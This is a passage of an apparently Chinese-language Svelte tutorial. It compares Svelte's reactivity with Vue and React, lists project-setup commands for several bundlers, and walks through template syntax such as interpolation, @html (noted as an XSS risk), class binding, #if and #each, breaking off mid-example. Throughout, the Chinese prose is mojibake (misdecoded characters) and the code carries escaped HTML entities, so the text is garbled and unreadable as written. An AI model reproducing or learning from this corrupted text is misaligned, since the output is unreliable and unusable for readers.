é€™å€‹æ¦‚å¿µï¼Œåƒ Vue å’Œ React é€™äº›æ¡†æ¶ï¼Œéƒ½æœ‰éŸ¿æ‡‰å¼æ•¸æ“šçš„æ¦‚å¿µã€‚\nä½† Vue å’Œ React åœ¨æ•¸æ“šéŸ¿æ‡‰æ–¹é¢é‚„æ˜¯æœ‰é»ä¸é‚£éº¼è‡ªç„¶ï¼Œæˆ‘ç°¡å–®èˆ‰å¹¾å€‹ä¾‹å­ï¼š\nåœ¨ React ä¸­ï¼Œå¦‚æœéœ€è¦æ›´æ–°æ•¸æ“šä¸¦åœ¨è¦–åœ–ä¸­éŸ¿æ‡‰ï¼Œéœ€è¦ä½¿ç”¨ setState æ–¹æ³•æ›´æ–°æ•¸æ“šã€‚\nåœ¨ Vue2 ä¸­ï¼ŒéŸ¿æ‡‰å¼æ•¸æ“šè¦æ”¾åœ¨ data è£¡ï¼Œåœ¨ methods ä¸­ä½¿ç”¨ this.xxx ä¾†æ›´æ–°æ•¸æ“šã€‚\nåœ¨ Vue3 çš„ Composition API èªæ³•ä¸­ï¼Œéœ€è¦ä½¿ç”¨ ref æˆ–è€… reactive ç­‰æ–¹æ³•åŒ…è£¹æ•¸æ“šï¼Œä½¿ç”¨ xxx.value ç­‰æ–¹å¼ä¿®æ”¹æ•¸æ“šã€‚\nä¸Šé¢é€™å¹¾ç¨®æƒ…æ³ï¼Œæ„Ÿè¦ºå¤šå°‘éƒ½æ·»åŠ äº†é»æ±è¥¿æ‰èƒ½å¯¦ç¾éŸ¿æ‡‰å¼æ•¸æ“šåŠŸèƒ½ï¼ˆè‡³å°‘åœ¨æ™®é€šé–‹ç™¼è€…é–‹ç™¼æ™‚æ˜¯é€™æ¨£ï¼‰ã€‚\nåœ¨ Svelte çš„ç†å¿µä¸­ï¼ŒéŸ¿æ‡‰å¼æ‡‰è©²çµ¦é–‹ç™¼è€…ä¸€ç¨®ç„¡æ„Ÿé«”é©—ï¼Œæ¯”å¦‚åœ¨ Excel ä¸­ï¼Œç•¶æˆ‘è¦å®š C1 å–®å…ƒæ ¼çš„å€¼æ˜¯ A1 + B1 çš„å’Œï¼Œè¨­ç½®å¥½è¦å‰‡å¾Œï¼Œç”¨æˆ¶åªéœ€è¦ä¿®æ”¹ A1 å’Œ B1 å³å¯ï¼ŒC1 æœƒè‡ªå‹•éŸ¿æ‡‰ï¼Œè€Œä¸éœ€å†åšå…¶ä»–æ“ä½œã€‚\nåœ¨é€™æ–¹é¢ï¼ŒSvelte æˆ‘èªç‚ºåœ¨ç¾éšæ®µæ˜¯åšå¾—æœ€è‡ªç„¶çš„ã€‚\n1 2 3 4 5 6 7 8 9 \u0026lt;h1\u0026gt;{name}\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; setTimeout(() =\u0026gt; { name = \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39; }, 1000) \u0026lt;/script\u0026gt; ä¸Šé¢çš„ä»£ç¢¼ä¸­ï¼Œ1ç§’å¾Œä¿®æ”¹ name çš„å€¼ï¼Œä¸¦æ›´æ–°è¦–åœ–ã€‚\nå¾ä»£ç¢¼å°±èƒ½çœ‹å‡ºï¼Œåœ¨ä½¿ç”¨ Svelte é–‹ç™¼é …ç›®æ™‚ï¼Œé–‹ç™¼è€…ä¸€èˆ¬ç„¡éœ€ä½¿ç”¨é¡å¤–çš„æ–¹æ³•å°±èƒ½åšåˆ°å’Œ Vueã€React çš„éŸ¿æ‡‰å¼æ•ˆæœã€‚\nå¦‚æœä½ å° Svelte éŸ¿æ‡‰å¼åŸç†æ„Ÿèˆˆè¶£ï¼Œæ¨è–¦é–±è®€ FESKY çš„ ã€ŠSvelte éŸ¿æ‡‰å¼åŸç†å‰–æâ€”â€” é‡æ–°æ€è€ƒReactivityã€‹\nä¹Ÿå¯ä»¥çœ‹çœ‹ ã€ŠRethinking reactivityã€‹ï¼Œçœ‹çœ‹å®˜æ–¹å° reactivity çš„æ€è€ƒã€‚\næ€§èƒ½å¼· Stefan Krause çµ¦å‡ºä¸€ä»½ æ€§èƒ½æ¸¬è©¦å ±å‘Šï¼ˆé»æ“Šå¯æŸ¥çœ‹ï¼‰ å°æ¯”é‡Œå¤šå€‹ç†±é–€æ¡†æ¶çš„æ€§èƒ½ã€‚å¾ Svelte çš„æ€§èƒ½æ¸¬è©¦çµæœå¯ä»¥çœ‹å‡ºï¼ŒSvelte æ˜¯ç›¸ç•¶å„ªç§€çš„ã€‚\nå…§å­˜å„ªåŒ– æ€§èƒ½æ¸¬è©¦å ±å‘Šï¼ˆé»æ“Šå¯æŸ¥çœ‹ï¼‰ ä¹Ÿåˆ—å‡ºä¸åŒæ¡†æ¶çš„å…§å­˜ä½”ç”¨ç¨‹åº¦ï¼ŒSvelte å°å…§å­˜çš„ç®¡ç†åšåˆ°éå¸¸æ¥µè‡´ï¼Œä½”ç”¨çš„å…§å­˜ä¹Ÿæ˜¯éå¸¸å°ï¼Œé€™å°æ–¼é…ç½®ä¸é«˜çš„è¨­å‚™ä¾†èªªæ˜¯ä»¶å¥½äº‹ã€‚\nç¬¬5ã€6é»ï¼Œç”±æ–¼æ¸¬è©¦å ±å‘Šæ¯”è¼ƒé•·ï¼Œæˆ‘æ²’æˆªåœ–æ”¾é€²æ–‡ä¸­ã€‚å¤§å®¶æœ‰èˆˆè¶£å¯ä»¥é»é–‹éˆæ¥æŸ¥çœ‹æ¸¬è©¦å ±å‘Šã€‚\næ›´é—œæ³¨ç„¡éšœç¤™é«”é©— åœ¨ä½¿ç”¨ Svelte é–‹ç™¼æ™‚æœƒ è‡ªå‹•å°ç„¡éšœç¤™è¨ªå•æ–¹é¢çš„é«”é©—é€²è¡Œæª¢æ¸¬ï¼Œæ¯”å¦‚ img å…ƒç´ æ²’æœ‰æ·»åŠ  alt å±¬æ€§ï¼ŒSvelte æœƒå‘ä½ ç™¼å‡ºä¸€æ¢è­¦å‘Šã€‚ç„¡éšœç¤™é«”é©—å°ç‰¹æ®Šäººäº‹ä¾†èªªæ˜¯å¾ˆæœ‰å¹«åŠ©çš„ï¼Œæ¯”å¦‚ç•¶ä½ åœ¨ img æ¨™ç±¤ä¸­è¨­ç½®å¥½ alt å±¬æ€§å€¼ï¼Œä½¿ç”¨æœ‰è²ç€è¦½å™¨æœƒæŠŠ alt çš„å…§å®¹è®€å‡ºä¾†ã€‚\nåœ¨æ­¤æˆ‘é‚„è¦æ¨è–¦2æœ¬é—œæ–¼è¨­è¨ˆé«”é©—çš„æ›¸ã€‚\nã€Šé»çŸ³æˆé‡‘ï¼šè¨ªå®¢è‡³ä¸Šçš„Webå’Œç§»å‹•å¯ç”¨æ€§è¨­è¨ˆç§˜ç¬ˆã€‹ ã€ŠåŒ…å®¹æ€§Webè¨­è¨ˆã€‹ å®ƒå€‘çš„å°é¢é•·åˆ†åˆ¥é€™å€‹æ¨£å­\nSvelte çš„å„ªå‹¢è‚¯å®šé‚„æœ‰å¾ˆå¤šï¼Œä½†ç”±æ–¼æˆ‘é–‹ç™¼ç¶“é©—ä¸è¶³ï¼Œåªèƒ½ç¸½çµå‡ºä»¥ä¸Šé€™äº›äº†ã€‚å¦‚æœä½ å° Svelte æœ‰æ›´å¤šç†è§£ï¼Œæ­¡è¿åœ¨è©•è«–å€è£œå……~\nSvelte çš„ä¸è¶³ Svelte å° IE æ˜¯éå¸¸ä¸å‹å¥½çš„ï¼Œä½†æˆ‘ä¸¦ä¸æŠŠé€™æ”¾åœ¨çœ¼è£¡ã€‚å¦‚æœæƒ³å…¼å®¹ IE æˆ‘é‚„æ˜¯æ¨è–¦ä½¿ç”¨ jQueryã€‚ Svelte çš„ç”Ÿæ…‹ä¸å¤ è±å¯Œã€‚ç”±æ–¼æ˜¯æ–°å¯µï¼Œç”Ÿæ…‹æ–¹é¢è‚¯å®šæ˜¯ä¸å¦‚ Vue å’Œ React çš„ã€‚ èˆ‡ Svelte ç›¸é—œçš„åº« Sapper Sapper å®˜ç¶²åœ°å€\nSapper æ˜¯æ§‹å»ºåœ¨Svelte ä¸Šçš„æ¡†æ¶ï¼ŒSapper æä¾›äº†é é¢è·¯ç”±ã€ä½ˆå±€æ¨¡æ¿ã€SSRç­‰åŠŸèƒ½ã€‚\nSvelte Native Svelte Native å®˜ç¶²åœ°å€\nSvelte Native æ˜¯å»ºç«‹åœ¨ NativeScript ä¹‹ä¸Šçš„ç”¢ç‰©ï¼Œå¯ä»¥é–‹ç™¼å®‰å“å’ŒiOSæ‡‰ç”¨ï¼Œæ˜¯ä¸€å€‹è·¨ç«¯æŠ€è¡“ã€‚\næœ‰é»é¡ä¼¼æ–¼ React Native å’Œ Weex ä¹‹é¡çš„æ±è¥¿ã€‚\nsvelte-gl svelte-gl Github\nsvelte-gl é‚„æ²’æ­£å¼ç™¼å¸ƒï¼Œä½†é€™æ˜¯å€‹å¾ˆæœ‰è¶£çš„å·¥å…·ï¼Œå®ƒå’Œthree.jsé¡ä¼¼ï¼Œå°ˆé–€åš3Dæ‡‰ç”¨çš„ã€‚\né›–ç„¶ç¾åœ¨ github ä¸Šçš„ Star é‚„ä¸æ˜¯å¾ˆå¤šï¼Œä½†ä¹Ÿå¯ä»¥å¯«äº› demo ç©ç©ã€‚\nå‰µå»ºé …ç›® åœ¨é–‹å§‹ä¹‹å‰ï¼Œä½ éœ€è¦åœ¨é›»è…¦ä¸Šå®‰è£Nodeç’°å¢ƒ(v16+)ã€‚\nç·¨è¼¯å·¥å…·æˆ‘ä½¿ç”¨äº† VS Codeï¼ŒåŒæ™‚å®‰è£äº† Svelte for VS Code æ“´å±•æ’ä»¶ã€‚\nä½¿ç”¨ Svelte å‰ï¼Œå¿…é ˆæœ‰ä¸€å€‹é–‹ç™¼ç’°å¢ƒã€‚\nå‰µå»ºæˆ–ä½¿ç”¨é–‹ç™¼ç’°å¢ƒæœ‰ä»¥ä¸‹å¹¾ç¨®æ–¹å¼ï¼š\nREPL Rollupç‰ˆ Webpackç‰ˆ Parcelç‰ˆ Viteç‰ˆ æœ¬æ–‡ä½¿ç”¨çš„æ˜¯ Vite å‰µå»ºé …ç›®ï¼Œä½†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰æ–¹å¼æˆ‘éƒ½æœƒé€ä¸€èªªèªªã€‚\nREPL REPLæ˜¯ Svelte æä¾›çš„ä¸€å€‹ç·šä¸Šç’°å¢ƒï¼Œæ‰“é–‹ Svelte å®˜ç¶² å¯ä»¥çœ‹åˆ°é ‚éƒ¨å°èˆªæ¬„ä¸Šé¢æœ‰å€‹ REPL çš„é¸é …ã€‚é»æ“Šè©²é¸é …å°±å¯ä»¥è·³è½‰åˆ° Svelte ç·šä¸Šé–‹ç™¼ç’°å¢ƒäº†ã€‚\nREPL æ˜¯ read(è®€å–)ã€evaluate(åŸ·è¡Œ)ã€print(æ‰“å°) å’Œ loop(å¾ªç’°) é€™å¹¾å€‹å–®è©çš„ç¸®å¯«ã€‚\nå¦‚æœä½ åªæ˜¯æƒ³å˜—è©¦ Svelte çš„æŸäº›åŠŸèƒ½æˆ–è€…æ¸¬è©¦å°å‹ä»£ç¢¼ï¼Œå¯ä»¥ä½¿ç”¨é€™æ¬¾ç·šä¸Šå·¥å…·ã€‚\nREPLé‚„æä¾›äº†å¤šçµ„ä»¶é–‹ç™¼ï¼ŒæŒ‰å·¦ä¸Šè§’çš„ ï¼‹ å¯ä»¥å‰µå»ºæ–°çµ„ä»¶ã€‚çµ„ä»¶çš„å…§å®¹ç¨å¾Œæœƒèªªåˆ°ã€‚\nç•Œé¢å³å´ï¼Œé ‚éƒ¨æœ‰3å€‹é¸é …ï¼š\nResultï¼š é‹è¡Œçµæœã€‚ JS outputï¼š Svelte ç·¨è­¯å¾Œçš„ JS ä»£ç¢¼ã€‚ CSS outputï¼š Svelte ç·¨è­¯å¾Œçš„ CSS ä»£ç¢¼ã€‚ åœ¨ REPL ç•Œé¢å³ä¸Šè§’é‚„æœ‰ä¸€å€‹ä¸‹è¼‰æŒ‰éˆ•ã€‚\nç•¶ä½ åœ¨ç·šä¸Šç’°å¢ƒå¯«å¥½ä»£ç¢¼ï¼Œå¯ä»¥é»æ“Šä¸‹è¼‰æŒ‰éˆ•æŠŠé …ç›®ä¿å­˜åˆ°æœ¬åœ°ï¼Œä¸‹è¼‰çš„æ–‡ä»¶æ˜¯ä¸€å€‹ zipï¼Œéœ€è¦è‡ªå·±æ‰‹å‹•è§£å£“ã€‚\nç„¶å¾Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆå§‹åŒ–é …ç›®ä¸¦é‹è¡Œå³å¯ã€‚\n1 2 3 4 5 6 7 # 1. åˆå§‹åŒ–é …ç›® npm install # 2. é‹è¡Œé …ç›® npm run dev # 3. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:5000 é‹è¡Œçµæœï¼š\nRollup ç‰ˆ Svelte å®˜æ–¹ä¹Ÿæä¾›äº†ä¸€å€‹å‘½ä»¤ï¼Œå¯ä»¥ä¸‹è¼‰ Svelte é …ç›®åˆ°æœ¬åœ°ã€‚\nå‘½ä»¤æœ€å¾Œéœ€è¦è¼¸å…¥ä½ çš„é …ç›®åç¨±ã€‚\n1 2 3 4 5 6 7 8 9 10 # 1. ä¸‹è¼‰æ¨¡æ¿ npx degit sveltejs/template é …ç›®åç¨± # 2. å®‰è£ä¾è³´ npm install # 3. é‹è¡Œé …ç›® npm run dev # 4. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:8080 é‹è¡Œçµæœï¼š\né€™æ˜¯å®˜æ–¹æä¾›çš„å‰µå»ºé …ç›®æ–¹å¼ï¼Œé€™å€‹é …ç›®æ˜¯ä½¿ç”¨ Rollup æ‰“åŒ…çš„ã€‚ Rollup å’Œ Svelte éƒ½æ˜¯åŒä¸€å€‹ä½œè€…ï¼ˆRich Harrisï¼‰é–‹ç™¼çš„ï¼Œç”¨å›è‡ªå®¶æ±è¥¿å¾ˆæ­£å¸¸ã€‚\nWebpack ç‰ˆ å¦‚æœä½ ä¸æƒ³ä½¿ç”¨ Rollup æ‰“åŒ…é …ç›®ï¼Œå¯ä»¥å˜—è©¦ä½¿ç”¨ Webpackã€‚\n1 2 3 4 5 6 7 8 9 10 # 1. ä¸‹è¼‰æ¨¡æ¿ npx degit sveltejs/template-webpack é …ç›®åç¨± # 2. å®‰è£ä¾è³´ npm install # 3. é‹è¡Œé …ç›® npm run dev # 4. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:8080 é‹è¡Œçµæœï¼š\nParcel ç‰ˆ æˆ‘ä¸¦ ä¸æ¨è–¦ä½¿ç”¨ è©²æ–¹æ³•å‰µå»ºé …ç›®ï¼Œå› ç‚ºSvelte ä¸¦æ²’æœ‰æä¾›ä½¿ç”¨Parcel æ‰“åŒ…å·¥å…·çš„æ¨¡æ¿ã€‚ä½† GitHub ä¸Šæœ‰ç¬¬ä¸‰æ–¹çš„è§£æ±ºæ–¹æ¡ˆï¼ˆé»æ“Šè¨ªå•å€‰åº«ï¼‰ã€‚\nå°‡DeMoorJasper/parcel-plugin-svelteçš„ä»£ç¢¼ä¸‹è¼‰ä¸‹ä¾†ã€‚\n1 2 3 4 5 6 7 8 9 # 1. é€²å…¥ `packages/svelte-3-example` ç›®éŒ„ # 2. å®‰è£ä¾è³´ npm install # 3. é‹è¡Œé …ç›® npm run start # 4. åœ¨ç€è¦½å™¨è¨ªå• http://localhost:1234 é‹è¡Œçµæœï¼š\nVite ç‰ˆ æœ¬æ–‡æ¥ä¸‹ä¾†æ‰€æœ‰ä¾‹å­éƒ½æ˜¯ä½¿ç”¨ Vite å‰µå»º Svelte é …ç›®é€²è¡Œé–‹ç™¼çš„ã€‚\nä½¿ç”¨ Vite å‰µå»ºé …ç›®çš„åŸå› æ˜¯ï¼šå¿«ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1. ä¸‹è¼‰æ¨¡æ¿ npm init vite@latest # 2. è¼¸å…¥é …ç›®åç¨± # 3. é¸æ“‡ Svelte æ¨¡æ¿(æˆ‘æ²’é¸ts) # 4. å®‰è£ä¾è³´ npm install # 5. é‹è¡Œé …ç›® npm run dev # 6. åœ¨ç€è¦½å™¨è¨ªå• http://127.0.0.1:5173 é‹è¡Œçµæœï¼š\næœ¬æ–‡ä½¿ç”¨ Vite å‰µå»ºé …ç›®ï¼Œç›®éŒ„çµæ§‹å’ŒRollupç‰ˆå‰µå»ºå‡ºä¾†çš„é …ç›®çµæ§‹ç¨å¾®æœ‰é»ä¸åŒï¼Œä½†é–‹ç™¼é‚è¼¯æ˜¯ä¸€æ¨£çš„ã€‚\nèµ·æ­¥ index.htmlã€src/main.js å’Œ src/App.svelte é€™ä¸‰å€‹æ˜¯æœ€ä¸»è¦çš„æ–‡ä»¶ã€‚\nindex.html æ˜¯é …ç›®é‹è¡Œçš„å…¥å£æ–‡ä»¶ï¼Œå®ƒè£¡é¢å¼•ç”¨äº† src/main.js æ–‡ä»¶ã€‚\nsrc/main.js è£¡å¼•å…¥äº† src/App.svelte çµ„ä»¶ï¼Œä¸¦ä½¿ç”¨ä»¥ä¸‹ä»£ç¢¼å°‡ src/App.svelte çš„å…§å®¹æ¸²æŸ“åˆ° #app å…ƒç´ è£¡ã€‚\n1 2 3 const app = new App({ target: document.getElementById(\u0026#39;app\u0026#39;) }) target æŒ‡æ˜ç›®æ¨™å…ƒç´ ã€‚\næˆ‘å€‘å¤§éƒ¨åˆ†ä»£ç¢¼éƒ½æ˜¯å¯«åœ¨ .svelte å¾Œç¶´çš„æ–‡ä»¶è£¡ã€‚\n.svelte æ–‡ä»¶ä¸»è¦ç¢ºä¿ å¤šå€‹ HTML å…ƒç´ ã€1å€‹ script å…ƒç´  å’Œ 1å€‹ style å…ƒç´ ã€‚é€™3é¡å…ƒç´ éƒ½æ˜¯å¯é¸çš„ã€‚\næˆ‘å€‘ä¸»è¦çš„å·¥ä½œç›®éŒ„æ˜¯ src ç›®éŒ„ã€‚\nç‚ºäº†æ¸›è¼•å­¸ç¿’é›£åº¦ï¼Œæˆ‘å€‘å…ˆåšé€™å¹¾æ­¥æ“ä½œã€‚\næ¸…ç©ºå…¨å±€æ¨£å¼ å¦‚æœä½ ä½¿ç”¨Rollupç‰ˆå‰µå»ºé …ç›®ï¼Œä¸éœ€è¦åšé€™ä¸€æ­¥ã€‚\nåœ¨ä½¿ç”¨ Vite å‰µå»ºçš„ Svelte é …ç›®ä¸­ï¼Œæ‰¾åˆ° src/app.css æ–‡ä»¶ï¼Œä¸¦æŠŠè£¡é¢çš„å…§å®¹æ¸…ç©ºæ‰ã€‚\næ”¹é€  src/App.svelte å°‡ src/App.svelte æ–‡ä»¶æ”¹æˆä»¥ä¸‹å…§å®¹\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let name = \u0026#39;é›·ä¾¯\u0026#39; function handleClick() { name = \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39; } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;Hello {name}\u0026lt;/div\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt;æ”¹å\u0026lt;/button\u0026gt; æ­¤æ™‚é»æ“ŠæŒ‰éˆ•ï¼Œé é¢ä¸Šçš„\u0026quot;é›·çŒ´\u0026quot; å°±æœƒè®Šæˆ\u0026quot;é¯Šé­šè¾£æ¤’\u0026quot;\nä¸Šé¢çš„ä»£ç¢¼å…¶å¯¦å’Œ Vue æœ‰é»åƒã€‚\nè®Šé‡å’Œæ–¹æ³•éƒ½å¯«åœ¨ \u0026lt;script\u0026gt; æ¨™ç±¤è£¡ã€‚ åœ¨ HTML ä¸­ä½¿ç”¨ {} å¯ä»¥ç¶å®šè®Šé‡å’Œæ–¹æ³•ã€‚ é€šé on:click å¯ä»¥ç¶å®šé»æ“Šäº‹ä»¶ã€‚ åªéœ€å¯«ä»¥ä¸Šä»£ç¢¼ï¼ŒSvelte å°±æœƒè‡ªå‹•å¹«æˆ‘å€‘åšæ•¸æ“šéŸ¿æ‡‰çš„æ“ä½œã€‚ä¸€æ—¦æ•¸æ“šç™¼ç”Ÿæ”¹è®Šï¼Œè¦–åœ–ä¹Ÿæœƒè‡ªå‹•æ”¹è®Šã€‚\næ˜¯ä¸æ˜¯éå¸¸ç°¡å–®ï¼\nåŸºç¤æ¨¡æ¿èªæ³• Svelte çš„æ¨¡æ¿èªæ³•å…¶å¯¦å’Œ Vue æ˜¯æœ‰é»åƒçš„ã€‚å¦‚æœä½ ä¹‹å‰å·²ç¶“ä½¿ç”¨é Vueï¼Œé‚£æœ¬ç¯€å­¸èµ·ä¾†å°±éå¸¸ç°¡å–®ã€‚\næ’å€¼ åœ¨\u0026quot;èµ·æ­¥ç« ç¯€\u0026quot; å·²ç¶“ä½¿ç”¨é æ’å€¼ äº†ã€‚åœ¨ Svelte ä¸­ï¼Œä½¿ç”¨ {} å¤§æ‹¬è™Ÿå°‡ script è£¡çš„æ•¸æ“šç¶å®šåˆ° HTML ä¸­ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; æ­¤æ™‚é é¢ä¸Šå°±æœƒå‡ºç¾ name çš„å€¼ã€‚\né€™ç¨®èªæ³•å’Œ Vue æ˜¯æœ‰é»åƒçš„ï¼ŒVue ä½¿ç”¨é›™å¤§æ‹¬è™Ÿçš„æ–¹å¼ {{}} ç¶å®šæ•¸æ“šã€‚ Svelte å°±å°‘ä¸€å°æ‹¬è™Ÿã€‚\nè¡¨é”å¼ åœ¨ HTML ä¸­é™¤äº†å¯ä»¥ç¶å®šè®Šé‡å¤–ï¼Œé‚„å¯ä»¥ç¶å®šè¡¨é”å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; function sayHi() { return `${name} ä¸–ç•Œï¼` } let a = 1 let b = 2 let state = false \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{sayHi()}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{a} + {b} = {a + b}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{state ? \u0026#39;é›·çŒ´\u0026#39; : \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39;}\u0026lt;/div\u0026gt; å±¬æ€§ç¶å®š HTML çš„å±¬æ€§éœ€è¦å‹•æ…‹ç¶å®šæ•¸æ“šæ™‚ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ {} èªæ³•ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div title={name}\u0026gt;Hello\u0026lt;/div\u0026gt; ç•¶é¼ æ¨™æ”¾åˆ° div æ¨™ç±¤ä¸Šæ™‚ï¼Œæœƒå‡ºç¾ title è£¡çš„æç¤ºä¿¡æ¯ã€‚\næ¸²æŸ“ HTML æ¨™ç±¤ @html å¦‚æœåªæ˜¯ä½¿ç”¨æ’å€¼çš„æ–¹æ³•æ¸²æŸ“å¸¶æœ‰ HTML æ¨™ç±¤çš„å…§å®¹ï¼ŒSvelte æœƒè‡ªå‹•è½‰ç¾© \u0026lt;ã€\u0026gt; ä¹‹é¡çš„æ¨™ç±¤ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{h1El}\u0026lt;/div\u0026gt; é€™ç¨®æƒ…æ³å¤šæ•¸å‡ºç¾åœ¨æ¸²æŸ“æ–‡æœ¬ã€‚\nåœ¨ Vue ä¸­æœ‰ v-html æ–¹æ³•ï¼Œå®ƒå¯ä»¥å°‡ HTML æ¨™ç±¤æ¸²æŸ“å‡ºä¾†ã€‚åœ¨ Svelte ä¸­ä¹Ÿæœ‰é€™å€‹æ–¹æ³•ï¼Œåœ¨æ’å€¼å‰é¢ä½¿ç”¨ @html æ¨™è¨˜ä¸€ä¸‹å³å¯ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{@html h1El}\u0026lt;/div\u0026gt; ä½†æ­¤æ–¹æ³•æœ‰å¯èƒ½é­å— XSS æ”»æ“Šã€‚\næˆ‘åœ¨ ã€ŒNodeJS é˜²æ­¢ xss æ”»æ“Šã€ ä¸­ç°¡å–®æ¼”ç¤ºé XSS æ”»æ“Šï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥çœ‹çœ‹ã€‚\næ¨£å¼ç¶å®š åœ¨æ—¥å¸¸é–‹ç™¼ä¸­ï¼Œçµ¦ HTML æ¨™ç±¤è¨­ç½®æ¨£å¼ä¸»è¦é€šé è¡Œå†… style å’Œ class å±¬æ€§ã€‚\nåŸºç¤çš„ HTML å¯«æ³•å’ŒåŸç”Ÿçš„ä¸€æ¨£ï¼Œé€™è£¡ä¸éå¤šè¬›è§£ã€‚\nä¸‹é¢ä¸»è¦è¬›å‹•æ…‹è¨­ç½®æ¨£å¼ï¼Œä¹Ÿå°±æ˜¯å°‡ JS è£¡çš„è®Šé‡æˆ–è€…è¡¨é”å¼ç¶å®šåˆ° style æˆ–è€… class è£¡ã€‚\nè¡Œå…§æ¨£å¼ style 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let color = \u0026#39;red\u0026#39; setTimeout(() =\u0026gt; { color = \u0026#39;blue\u0026#39; }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;color: {color}\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; 1ç§’å¾Œï¼Œæ–‡å­—å¾ç´…è‰²è®Šæˆè—è‰²ã€‚\nç¶å®šclass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let foo = true setTimeout(() =\u0026gt; { foo = false }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div class:active={foo}\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; \u0026lt;style\u0026gt; .active { color: red; } \u0026lt;/style\u0026gt; åœ¨ HTML è£¡å¯ä»¥ä½¿ç”¨ class:xxx å‹•æ…‹è¨­ç½®è¦æ¿€æ´»çš„é¡ã€‚é€™è£¡çš„ xxx æ˜¯å°æ‡‰çš„é¡åã€‚\nèªæ³•æ˜¯ class:xxx={state}ï¼Œç•¶ state ç‚º true æ™‚ï¼Œé€™å€‹æ¨£å¼å°±æœƒè¢«æ¿€æ´»ä½¿ç”¨ã€‚\næ¢ä»¶æ¸²æŸ“ #if ä½¿ç”¨ {#if} é–‹é ­ã€{/if} çµå°¾ã€‚\nåŸºç¤æ¢ä»¶åˆ¤æ–· 1 2 3 {#if æ¡ä»¶åˆ¤æ–­} ... {/if} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; {/if} 1ç§’å¾Œæ”¹è®Šç‹€æ…‹\nå…©ç¨®æ¢ä»¶ 1 2 3 4 5 {#if æ¡ä»¶åˆ¤æ–­} ... {:else} ... {/if} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;é¯Šé­šè¾£æ¤’\u0026lt;/div\u0026gt; {/if} å¤šç¨®æ¢ä»¶ 1 2 3 4 5 {#if æ¢ä»¶åˆ¤æ–·} ... {:else if æ¢ä»¶åˆ¤æ–·} ... {/if} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let count = 1 setInterval(() =\u0026gt; { count++ }, 1000) \u0026lt;/script\u0026gt; {#if count === 1} \u0026lt;div\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; {:else if count === 2} \u0026lt;div\u0026gt;é¯Šé­šè¾£æ¤’\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;èŸ‘è‚æƒ¡éœ¸\u0026lt;/div\u0026gt; {/if} æ¢ä»¶æ¸²æŸ“çš„ç”¨æ³•æ¯”è¼ƒç°¡å–®ï¼Œåªè¦ JS åŸºç¤å°±èƒ½çœ‹å¾—æ‡‚ã€‚\nåˆ—è¡¨æ¸²æŸ“ #each å¦‚æœä½ æœ‰ä¸€å †æ•¸æ“šéœ€è¦å±•ç¤ºå‡ºä¾†ï¼Œå¯ä»¥ä½¿ç”¨ #each æ–¹æ³•ã€‚\nä½¿ç”¨ {#each} é–‹é ­ã€{/each} çµå°¾ã€‚\néæ­·æ•¸çµ„ 1 2 3 {#each expression as name} ... {/each} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] 